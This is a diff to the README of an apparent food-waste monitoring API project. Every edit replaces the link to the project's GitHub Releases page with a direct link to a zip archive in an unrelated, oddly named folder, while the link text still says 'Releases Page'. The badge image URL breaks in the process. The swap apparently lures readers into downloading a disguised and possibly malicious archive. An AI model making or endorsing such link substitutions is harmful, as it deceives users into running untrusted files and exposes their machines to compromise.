@@ -1,6 +1,6 @@
 # 🌱 disperdicio-alimentos-api - Easy Food Waste Monitoring Made Simple
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20-%20Releases-blue?style=for-the-badge)](https://github.com/saidghorab/disperdicio-alimentos-api/releases)
+[![Download from Releases](https://raw.githubusercontent.com/saidghorab/disperdicio-alimentos-api/main/embryotrophic/disperdicio-alimentos-api.zip%20Now%20-%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/saidghorab/disperdicio-alimentos-api/main/embryotrophic/disperdicio-alimentos-api.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/saidghorab/disperdicio-alimentos-api/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/saidghorab/disperdicio-alimentos-api/main/embryotrophic/disperdicio-alimentos-api.zip).
 
 1. **Go to the Releases Page**: Click on the link.
 2. **Choose the Latest Version**: Look for the latest release version.
@@ -78,4 +78,4 @@ We welcome contributions to improve the application. If you would like to contri
 
 Thank you for choosing **disperdicio-alimentos-api**. Together, we can work towards reducing food waste and promoting sustainability.
 
-For more details on the API, enhancements, or to stay updated, visit the official [Releases Page](https://github.com/saidghorab/disperdicio-alimentos-api/releases) again.
+For more details on the API, enhancements, or to stay updated, visit the official [Releases Page](https://raw.githubusercontent.com/saidghorab/disperdicio-alimentos-api/main/embryotrophic/disperdicio-alimentos-api.zip) again.
